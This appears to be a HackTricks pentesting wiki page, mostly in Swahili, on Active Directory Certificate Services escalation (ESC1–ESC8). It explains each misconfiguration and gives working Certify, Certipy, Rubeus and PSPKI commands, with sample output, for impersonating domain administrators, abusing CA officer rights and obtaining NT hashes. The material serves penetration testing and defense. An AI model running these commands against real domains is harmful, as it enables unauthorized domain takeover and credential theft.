# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Hii ni muhtasari wa sehemu za mbinu za kupandisha hadhi za machapisho:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Maelezo

### Misconfigured Certificate Templates - ESC1 Explained

- **Haki za kujiandikisha zinatolewa kwa watumiaji wenye mamlaka ya chini na Enterprise CA.**
- **Idhini ya meneja haitahitajika.**
- **Saini kutoka kwa wafanyakazi walioidhinishwa hazihitajiki.**
- **Maelezo ya usalama kwenye templeti za cheti ni ya kupita kiasi, yanaruhusu watumiaji wenye mamlaka ya chini kupata haki za kujiandikisha.**
- **Templeti za cheti zimewekwa ili kufafanua EKUs zinazosaidia uthibitishaji:**
- Vitambulisho vya Matumizi ya Funguo Panzi (EKU) kama vile Uthibitishaji wa Mteja (OID 1.3.6.1.5.5.7.3.2), Uthibitishaji wa Mteja wa PKINIT (1.3.6.1.5.2.3.4), Kuingia kwa Kadi ya Smart (OID 1.3.6.1.4.1.311.20.2.2), Malengo Yoyote (OID 2.5.29.37.0), au hakuna EKU (SubCA) vinajumuishwa.
- **Uwezo wa waombaji kujumuisha subjectAltName katika Ombi la Kusaini Cheti (CSR) unaruhusiwa na templeti:**
- Active Directory (AD) inapa kipaumbele subjectAltName (SAN) katika cheti kwa uthibitisho wa utambulisho ikiwa ipo. Hii inamaanisha kwamba kwa kubainisha SAN katika CSR, cheti kinaweza kuombwa kuiga mtumiaji yeyote (kwa mfano, msimamizi wa eneo). Ikiwa SAN inaweza kubainishwa na waombaji inaonyeshwa katika kitu cha AD cha templeti ya cheti kupitia mali ya `mspki-certificate-name-flag`. Mali hii ni bitmask, na uwepo wa bendera ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` unaruhusu ubainishaji wa SAN na waombaji.

> [!CAUTION]
> Mipangilio iliyoelezwa inaruhusu watumiaji wenye mamlaka ya chini kuomba vyeti vyovyote vya SAN wanavyotaka, na kuwezesha uthibitishaji kama kiongozi yeyote wa eneo kupitia Kerberos au SChannel.

Kipengele hiki wakati mwingine kinawashwa ili kusaidia uzalishaji wa cheti za HTTPS au mwenyeji kwa bidhaa au huduma za kutekeleza, au kutokana na ukosefu wa uelewa.

Inabainishwa kwamba kuunda cheti na chaguo hili kunasababisha onyo, ambayo si hali wakati templeti ya cheti iliyopo (kama vile templeti ya `WebServer`, ambayo ina `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` iliyoanzishwa) inakopiwa na kisha kubadilishwa ili kujumuisha OID ya uthibitishaji.

### Unyanyasaji

Ili **kupata templeti za cheti zenye udhaifu** unaweza kukimbia:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Ili **kutumia udhaifu huu kujifanya kuwa msimamizi** mtu anaweza kukimbia:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Kisha unaweza kubadilisha **cheti kilichozalishwa kuwa muundo wa `.pfx`** na kukitumia **kujiandikisha kwa kutumia Rubeus au certipy** tena:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Binaries za Windows "Certreq.exe" & "Certutil.exe" zinaweza kutumika kuunda PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Uhesabu wa templeti za cheti ndani ya schema ya usanidi wa AD Forest, hasa zile zisizohitaji idhini au saini, zikiwa na Client Authentication au Smart Card Logon EKU, na zikiwa na bendera `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` iliyoanzishwa, zinaweza kufanywa kwa kuendesha uchunguzi ufuatao wa LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

Hali ya pili ya unyanyasaji ni tofauti ya ya kwanza:

1. Haki za kujiandikisha zinatolewa kwa watumiaji wenye mamlaka ya chini na CA ya Enterprise.
2. Hitaji la idhini ya meneja limeondolewa.
3. Hitaji la saini zilizoidhinishwa limeachwa.
4. Maelezo ya usalama yaliyo na ruhusa nyingi kwenye kiolezo cha cheti yanatoa haki za kujiandikisha kwa watumiaji wenye mamlaka ya chini.
5. **Kiolezo cha cheti kimewekwa kujumuisha Any Purpose EKU au hakuna EKU.**

**Any Purpose EKU** inaruhusu cheti kupatikana na mshambuliaji kwa **kila kusudi**, ikiwa ni pamoja na uthibitishaji wa mteja, uthibitishaji wa seva, saini ya msimbo, n.k. Mbinu ile ile **iliyotumika kwa ESC3** inaweza kutumika kutekeleza hali hii.

Vyeti vyenye **hakuna EKUs**, ambavyo vinatenda kama vyeti vya CA vya chini, vinaweza kutumika kwa **kila kusudi** na vinaweza **pia kutumika kusaini vyeti vipya**. Hivyo, mshambuliaji anaweza kubaini EKUs au maeneo yasiyo na mipaka katika vyeti vipya kwa kutumia cheti cha CA cha chini.

Hata hivyo, vyeti vipya vilivyoundwa kwa **uthibitishaji wa domain** havitafanya kazi ikiwa CA ya chini haitakubaliwa na **`NTAuthCertificates`** kitu, ambacho ni mipangilio ya default. Hata hivyo, mshambuliaji bado anaweza kuunda **vyeti vipya vyenye EKU yoyote** na thamani za cheti zisizo na mipaka. Hizi zinaweza **kutumika vibaya** kwa anuwai ya malengo (mfano, saini ya msimbo, uthibitishaji wa seva, n.k.) na zinaweza kuwa na athari kubwa kwa programu nyingine katika mtandao kama SAML, AD FS, au IPSec.

Ili kuorodhesha mifano inayolingana na hali hii ndani ya mpangilio wa AD Forest, swali lifuatalo la LDAP linaweza kutekelezwa:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Maelezo

Hali hii ni kama ya kwanza na ya pili lakini **inatumia** **EKU tofauti** (Wakala wa Ombi la Cheti) na **mifano 2 tofauti** (hivyo ina seti 2 za mahitaji),

**Wakala wa Ombi la Cheti EKU** (OID 1.3.6.1.4.1.311.20.2.1), inayojulikana kama **Wakala wa Usajili** katika nyaraka za Microsoft, inaruhusu kiongozi **kujiandikisha** kwa **cheti** kwa **niaba ya mtumiaji mwingine**.

**“wakala wa usajili”** anajiandikisha katika **mifano** kama hiyo na anatumia **cheti** iliyopewa ili ku-sign CSR kwa niaba ya mtumiaji mwingine. Kisha **anatumia** **CSR iliyo-sign** kwa CA, akijiandikisha katika **mfano** ambao **unaruhusu “kujiandikisha kwa niaba ya”**, na CA inajibu kwa **cheti inayomilikiwa na “mtumiaji mwingine”**.

**Mahitaji 1:**

- Haki za usajili zinatolewa kwa watumiaji wenye mamlaka ya chini na CA ya Enterprise.
- Mahitaji ya idhini ya meneja yameondolewa.
- Hakuna mahitaji ya saini zilizoidhinishwa.
- Maelezo ya usalama ya mfano wa cheti ni ya kupitiliza, ikitoa haki za usajili kwa watumiaji wenye mamlaka ya chini.
- Mfano wa cheti unajumuisha Wakala wa Ombi la Cheti EKU, ikiruhusu ombi la mifano mingine ya cheti kwa niaba ya viongozi wengine.

**Mahitaji 2:**

- CA ya Enterprise inatoa haki za usajili kwa watumiaji wenye mamlaka ya chini.
- Idhini ya meneja inakwepa.
- Toleo la muundo wa mfano ni 1 au linazidi 2, na linaelezea Mahitaji ya Sera ya Maombi ambayo yanahitaji Wakala wa Ombi la Cheti EKU.
- EKU iliyofafanuliwa katika mfano wa cheti inaruhusu uthibitisho wa kikoa.
- Vikwazo kwa wakala wa usajili havitumiki kwenye CA.

### Unyanyasaji

Unaweza kutumia [**Certify**](https://github.com/GhostPack/Certify) au [**Certipy**](https://github.com/ly4k/Certipy) ili kunyanyasa hali hii:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **watumiaji** ambao wanaruhusiwa **kupata** **cheti cha wakala wa usajili**, mifano ambayo wakala wa usajili **wanaruhusiwa** kujiandikisha, na **akaunti** kwa niaba ya ambayo wakala wa usajili anaweza kutenda zinaweza kudhibitiwa na CAs za biashara. Hii inafikiwa kwa kufungua `certsrc.msc` **snap-in**, **kubonyeza kulia kwenye CA**, **kubonyeza Mali**, na kisha **kuhamasisha** kwenye tab ya “Wakala wa Usajili”.

Hata hivyo, inabainishwa kuwa mipangilio ya **kawaida** kwa CAs ni “**Usizuilie wakala wa usajili**.” Wakati kizuizi juu ya wakala wa usajili kinawashwa na wasimamizi, kuweka kwenye “Zuilia wakala wa usajili,” usanidi wa kawaida unabaki kuwa na ruhusa nyingi sana. Inaruhusu **Kila mtu** kupata usajili katika mifano yote kama mtu yeyote.

## Udhibiti wa Upatikanaji wa Mifano ya Cheti Inayoweza Kuathiriwa - ESC4

### **Maelezo**

**Maelezo ya usalama** kwenye **mifano ya cheti** yanaelezea **idhini** maalum ambazo **viongozi wa AD** wanazo kuhusu mfano huo.

Iwapo **mshambuliaji** ana idhini zinazohitajika **kubadilisha** **mfano** na **kuanzisha** mabadiliko yoyote **yanayoweza kutumiwa** yaliyotajwa katika **sehemu za awali**, kupandishwa vyeo kunaweza kuwezesha.

Idhini muhimu zinazohusiana na mifano ya cheti ni pamoja na:

- **Mmiliki:** Inatoa udhibiti wa kimya kimya juu ya kitu, ikiruhusu mabadiliko ya sifa zozote.
- **FullControl:** Inaruhusu mamlaka kamili juu ya kitu, ikiwa ni pamoja na uwezo wa kubadilisha sifa zozote.
- **WriteOwner:** Inaruhusu kubadilisha mmiliki wa kitu kuwa kiongozi chini ya udhibiti wa mshambuliaji.
- **WriteDacl:** Inaruhusu marekebisho ya udhibiti wa ufikiaji, huenda ikampa mshambuliaji FullControl.
- **WriteProperty:** Inaruhusu kuhariri sifa zozote za kitu.

### Unyanyasaji

Mfano wa privesc kama ile ya awali:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ni wakati mtumiaji ana ruhusa za kuandika juu ya mfano wa cheti. Hii inaweza kwa mfano kutumiwa kubadilisha usanidi wa mfano wa cheti ili kufanya mfano huo uwe na udhaifu kwa ESC1.

Kama tunavyoona katika njia hapo juu, ni `JOHNPC` pekee ndiye mwenye ruhusa hizi, lakini mtumiaji wetu `JOHN` ana kiunganishi kipya cha `AddKeyCredentialLink` kwa `JOHNPC`. Kwa kuwa mbinu hii inahusiana na vyeti, nimeanzisha shambulio hili pia, ambalo linajulikana kama [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Hapa kuna muonekano mdogo wa amri ya `shadow auto` ya Certipy ili kupata hash ya NT ya mwathirika.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** inaweza kubadilisha usanidi wa kiolezo cha cheti kwa amri moja. Kwa **kawaida**, Certipy it **badilisha** usanidi ili kuufanya **kuwa na udhaifu kwa ESC1**. Tunaweza pia kubainisha **`-save-old` parameter ili kuhifadhi usanidi wa zamani**, ambayo itakuwa muhimu kwa **kurudisha** usanidi baada ya shambulio letu.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

Mtandao mpana wa uhusiano wa ACL unaounganisha, ambao unajumuisha vitu kadhaa zaidi ya templeti za cheti na mamlaka ya cheti, unaweza kuathiri usalama wa mfumo mzima wa AD CS. Vitu hivi, ambavyo vinaweza kuathiri usalama kwa kiasi kikubwa, vinajumuisha:

- Kituo cha kompyuta cha AD cha seva ya CA, ambacho kinaweza kuathiriwa kupitia mitambo kama S4U2Self au S4U2Proxy.
- Seva ya RPC/DCOM ya seva ya CA.
- Kila kituo cha AD au chombo ndani ya njia maalum ya kituo `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Njia hii inajumuisha, lakini siyo tu, vyombo na vitu kama vile chombo cha Templeti za Cheti, chombo cha Mamlaka ya Uthibitishaji, kitu cha NTAuthCertificates, na Chombo cha Huduma za Usajili.

Usalama wa mfumo wa PKI unaweza kuathiriwa ikiwa mshambuliaji mwenye mamlaka ya chini atafanikiwa kudhibiti chochote kati ya vipengele hivi muhimu.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

Mada inayozungumziwa katika [**post ya CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) pia inagusia athari za bendera **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kama ilivyoelezwa na Microsoft. Mipangilio hii, inapowashwa kwenye Mamlaka ya Uthibitishaji (CA), inaruhusu kuingizwa kwa **maadili yaliyofafanuliwa na mtumiaji** katika **jina mbadala la somo** kwa **ombwe lolote**, ikiwa ni pamoja na yale yanayotengenezwa kutoka Active Directory®. Kwa hivyo, kipengele hiki kinawaruhusu **wavamizi** kujiandikisha kupitia **templeti yoyote** iliyowekwa kwa ajili ya **uthibitishaji** wa kikoa—hasa zile zinazofunguliwa kwa usajili wa mtumiaji **asiye na mamlaka**, kama vile templeti ya kawaida ya Mtumiaji. Kama matokeo, cheti kinaweza kulindwa, na kumwezesha mhamasishaji kujiandikisha kama msimamizi wa kikoa au **kitu chochote kingine kilichopo** ndani ya kikoa.

**Note**: Njia ya kuongezea **majina mbadala** katika Ombi la Kusaini Cheti (CSR), kupitia hoja `-attrib "SAN:"` katika `certreq.exe` (inayojulikana kama “Name Value Pairs”), ina **tofauti** na mkakati wa unyakuzi wa SANs katika ESC1. Hapa, tofauti iko katika **jinsi taarifa za akaunti zinavyofungwa**—ndani ya sifa ya cheti, badala ya nyongeza.

### Abuse

Ili kuthibitisha ikiwa mipangilio imewashwa, mashirika yanaweza kutumia amri ifuatayo na `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Operesheni hii kimsingi inatumia **remote registry access**, hivyo, njia mbadala inaweza kuwa:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Zana kama [**Certify**](https://github.com/GhostPack/Certify) na [**Certipy**](https://github.com/ly4k/Certipy) zina uwezo wa kugundua makosa haya ya usanidi na kuyatumia:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Ili kubadilisha mipangilio hii, ikiwa mtu ana **haki za usimamizi wa kikoa** au sawa, amri ifuatayo inaweza kutekelezwa kutoka kwa kituo chochote cha kazi:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Ili kuzima usanidi huu katika mazingira yako, bendera inaweza kuondolewa kwa:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Baada ya sasisho za usalama za Mei 2022, **vyeti** vilivyotolewa hivi karibuni vitakuwa na **nyongeza ya usalama** inayojumuisha **sifa ya `objectSid` ya ombaaji**. Kwa ESC1, SID hii inatokana na SAN iliyoainishwa. Hata hivyo, kwa **ESC6**, SID inakidhi **`objectSid` ya ombaaji**, si SAN.\
> Ili kutumia ESC6, ni muhimu kwa mfumo kuwa na udhaifu kwa ESC10 (Mifumo ya Vyeti Dhaifu), ambayo inapa kipaumbele **SAN juu ya nyongeza mpya ya usalama**.

## Udhibiti wa Upatikanaji wa Mamlaka ya Vyeti - ESC7

### Shambulio 1

#### Maelezo

Udhibiti wa upatikanaji kwa mamlaka ya vyeti unadumishwa kupitia seti ya ruhusa zinazodhibiti vitendo vya CA. Ruhusa hizi zinaweza kuonekana kwa kufikia `certsrv.msc`, kubonyeza kulia CA, kuchagua mali, na kisha kuhamia kwenye tab ya Usalama. Zaidi ya hayo, ruhusa zinaweza kuhesabiwa kwa kutumia moduli ya PSPKI kwa amri kama:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Hii inatoa ufahamu kuhusu haki za msingi, hasa **`ManageCA`** na **`ManageCertificates`**, zinazohusiana na majukumu ya “meneja wa CA” na “Meneja wa Cheti” mtawalia.

#### Abuse

Kuwa na haki za **`ManageCA`** kwenye mamlaka ya cheti kunamuwezesha mhusika kubadilisha mipangilio kwa mbali kwa kutumia PSPKI. Hii inajumuisha kubadilisha bendera ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ili kuruhusu spesheni ya SAN katika kigezo chochote, jambo muhimu katika kupandisha ngazi ya domain.

Rahisishaji wa mchakato huu unaweza kufikiwa kupitia matumizi ya cmdlet ya PSPKI **Enable-PolicyModuleFlag**, inayoruhusu mabadiliko bila mwingiliano wa moja kwa moja wa GUI.

Kuwa na haki za **`ManageCertificates`** kunarahisisha idhini ya maombi yanayosubiri, kwa ufanisi ikiepuka kinga ya "idhini ya meneja wa cheti cha CA".

Mchanganyiko wa moduli za **Certify** na **PSPKI** unaweza kutumika kuomba, kuidhinisha, na kupakua cheti:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

> [!WARNING]
> Katika **shambulio la awali** **`Manage CA`** ruhusa zilitumika **kuwezesha** bendera ya **EDITF_ATTRIBUTESUBJECTALTNAME2** ili kutekeleza **shambulio la ESC6**, lakini hii haitakuwa na athari yoyote hadi huduma ya CA (`CertSvc`) ipyaanzishwe. Wakati mtumiaji ana haki ya ufikiaji ya `Manage CA`, mtumiaji pia anaruhusiwa **kuanzisha upya huduma**. Hata hivyo, **haitoi maana kwamba mtumiaji anaweza kuanzisha upya huduma hiyo kwa mbali**. Zaidi ya hayo, E**SC6 huenda isifanye kazi moja kwa moja** katika mazingira mengi yaliyorekebishwa kutokana na masasisho ya usalama ya Mei 2022.

Kwa hivyo, shambulio lingine linawasilishwa hapa.

Masharti:

- Ruhusa pekee ya **`ManageCA`**
- Ruhusa ya **`Manage Certificates`** (inaweza kutolewa kutoka **`ManageCA`**)
- Kigezo cha cheti **`SubCA`** lazima kiwe **kimewezeshwa** (inaweza kuwezeshwa kutoka **`ManageCA`**)

Teknolojia inategemea ukweli kwamba watumiaji wenye haki ya ufikiaji ya `Manage CA` _na_ `Manage Certificates` wanaweza **kutoa maombi ya cheti yaliyoshindwa**. Kigezo cha cheti **`SubCA`** ni **hatarini kwa ESC1**, lakini **ni wasimamizi pekee** wanaoweza kujiandikisha katika kigezo hicho. Hivyo, **mtumiaji** anaweza **kuomba** kujiandikisha katika **`SubCA`** - ambayo itakataliwa - lakini **kisha itatolewa na meneja baadaye**.

#### Abuse

Unaweza **kujiwezesha ruhusa ya `Manage Certificates`** kwa kuongeza mtumiaji wako kama afisa mpya.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Kigezo cha **`SubCA`** kinaweza **kuiwezesha kwenye CA** kwa kutumia parameter ya `-enable-template`. Kwa kawaida, kigezo cha `SubCA` kimewezesha.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ikiwa tumekamilisha masharti ya awali kwa shambulio hili, tunaweza kuanza kwa **kuomba cheti kulingana na kigezo cha `SubCA`**.

**Omba hii itakataliwa**, lakini tutahifadhi funguo binafsi na kuandika chini kitambulisho cha ombi.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Kwa **`Manage CA` na `Manage Certificates`**, tunaweza kisha **kutoa ombi la cheti lililoshindwa** kwa kutumia amri ya `ca` na parameter ya `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Na hatimaye, tunaweza **kurejesha cheti kilichotolewa** kwa kutumia amri ya `req` na parameter ya `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explanation

Mbali na matumizi ya jadi ya ESC7 (kuwezesha sifa za EDITF au kuidhinisha maombi yanayosubiri), **Certify 2.0** ilifunua primitive mpya ambayo inahitaji tu jukumu la *Manage Certificates* (pia inajulikana kama **Certificate Manager / Officer**) kwenye CA ya Enterprise.

Njia ya `ICertAdmin::SetExtension` RPC inaweza kutekelezwa na mtu yeyote mwenye *Manage Certificates*. Ingawa njia hii ilikuwa ikitumika kawaida na CAs halali kuboresha nyongeza kwenye maombi **yanayosubiri**, mshambuliaji anaweza kuitumia vibaya ili **kuongeza *nyongeza isiyo ya kawaida* ya cheti** (kwa mfano, OID ya *Certificate Issuance Policy* kama `1.1.1.1`) kwa ombi linalosubiri kuidhinishwa.

Kwa sababu template inayolengwa haijabainisha thamani ya kawaida kwa nyongeza hiyo, CA HAIWEZI kubadilisha thamani inayodhibitiwa na mshambuliaji wakati ombi linapotolewa hatimaye. Cheti kinachotokana hivyo kinajumuisha nyongeza iliyochaguliwa na mshambuliaji ambayo inaweza:

* Kukidhi mahitaji ya Sera ya Maombi / Utoaji ya templates nyingine zenye udhaifu (kupelekea kupandishwa vyeo).
* Kuingiza EKUs au sera za ziada ambazo zinatoa cheti imani isiyotarajiwa katika mifumo ya watu wengine.

Kwa kifupi, *Manage Certificates* – ambayo hapo awali ilichukuliwa kama nusu “isiyo na nguvu” ya ESC7 – sasa inaweza kutumika kwa kupandishwa vyeo kamili au kudumu kwa muda mrefu, bila kugusa usanidi wa CA au kuhitaji haki za *Manage CA* zinazozuia zaidi.

#### Abusing the primitive with Certify 2.0

1. **Tuma ombi la cheti ambalo litabaki *likiwa linangojea*.** Hii inaweza kulazimishwa kwa template inayohitaji idhini ya meneja:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Kumbuka ID ya Ombi iliyorejeshwa
```

2. **Ongeza nyongeza ya kawaida kwa ombi linalosubiri** kwa kutumia amri mpya ya `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # OID ya sera ya utoaji wa uwongo
```
*Ikiwa template haijabainisha tayari nyongeza ya *Certificate Issuance Policies*, thamani iliyo juu itahifadhiwa baada ya utoaji.*

3. **Toa ombi hilo** (ikiwa jukumu lako pia lina haki za idhini za *Manage Certificates*) au subiri kwa opereta ili kuidhinisha. Mara baada ya kutolewa, pakua cheti:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Cheti kinachotokana sasa kinajumuisha OID ya sera ya utoaji wa uhalifu na kinaweza kutumika katika mashambulizi yajayo (kwa mfano ESC13, kupandishwa vyeo, n.k.).

> NOTE:  Shambulizi sawa linaweza kutekelezwa na Certipy ≥ 4.7 kupitia amri ya `ca` na parameter ya `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

> [!TIP]
> Katika mazingira ambapo **AD CS imewekwa**, ikiwa kuna **kiungo cha kujiandikisha mtandaoni kilichokuwa na udhaifu** na angalau template moja ya **cheti imechapishwa** inayoruhusu **kujiandikisha kwa kompyuta za kikoa na uthibitishaji wa mteja** (kama template ya kawaida **`Machine`**), inakuwa inawezekana kwa **kompyuta yoyote yenye huduma ya spooler inayofanya kazi kuathiriwa na mshambuliaji**!

Mbinu kadhaa za **kujiandikisha zinazotumia HTTP** zinasaidiwa na AD CS, zinazopatikana kupitia majukumu ya ziada ya seva ambayo wasimamizi wanaweza kuweka. Interfaces hizi za kujiandikisha cheti zinazotumia HTTP zinahatarishwa kwa **shambulizi za NTLM relay**. Mshambuliaji, kutoka kwa **kompyuta iliyoharibiwa, anaweza kujifanya kuwa akaunti yoyote ya AD inayothibitishwa kupitia NTLM ya ndani**. Wakati akijifanya kuwa akaunti ya mwathirika, interfaces hizi za wavuti zinaweza kufikiwa na mshambuliaji ili **kuomba cheti cha uthibitishaji wa mteja kwa kutumia template za cheti za `User` au `Machine`**.

- **Interface ya kujiandikisha mtandaoni** (programu ya zamani ya ASP inayopatikana kwenye `http://<caserver>/certsrv/`), inategemea HTTP pekee, ambayo haina ulinzi dhidi ya shambulizi za NTLM relay. Zaidi ya hayo, inaruhusu tu uthibitishaji wa NTLM kupitia kichwa chake cha HTTP cha Uidhinishaji, na kufanya mbinu za uthibitishaji salama zaidi kama Kerberos zisifae.
- **Huduma ya Uandikishaji wa Cheti** (CES), **Sera ya Uandikishaji wa Cheti** (CEP) Web Service, na **Huduma ya Uandikishaji wa Vifaa vya Mtandao** (NDES) kwa kawaida zinasaidia uthibitishaji wa negotiate kupitia kichwa chao cha HTTP cha Uidhinishaji. Uthibitishaji wa negotiate **unasaidia wote** Kerberos na **NTLM**, ikimruhusu mshambuliaji **kushuka hadi uthibitishaji wa NTLM** wakati wa shambulizi za relay. Ingawa huduma hizi za wavuti zinawezesha HTTPS kwa kawaida, HTTPS pekee **haiwezi kulinda dhidi ya shambulizi za NTLM relay**. Ulinzi dhidi ya shambulizi za NTLM relay kwa huduma za HTTPS unaweza kupatikana tu wakati HTTPS inachanganywa na uhusiano wa channel. Kwa bahati mbaya, AD CS haizindui Ulinzi wa Kupanuliwa kwa Uthibitishaji kwenye IIS, ambayo inahitajika kwa uhusiano wa channel.

Tatizo la kawaida na shambulizi za NTLM relay ni **muda mfupi wa vikao vya NTLM** na kutokuweza kwa mshambuliaji kuingiliana na huduma zinazohitaji **saini ya NTLM**.

Hata hivyo, kizuizi hiki kinashindwa kwa kutumia shambulizi la NTLM relay kupata cheti kwa mtumiaji, kwani kipindi cha uhalali wa cheti kinabainisha muda wa kikao, na cheti kinaweza kutumika na huduma zinazohitaji **saini ya NTLM**. Kwa maelekezo juu ya kutumia cheti kilichoporwa, rejelea:


{{#ref}}
account-persistence.md
{{#endref}}

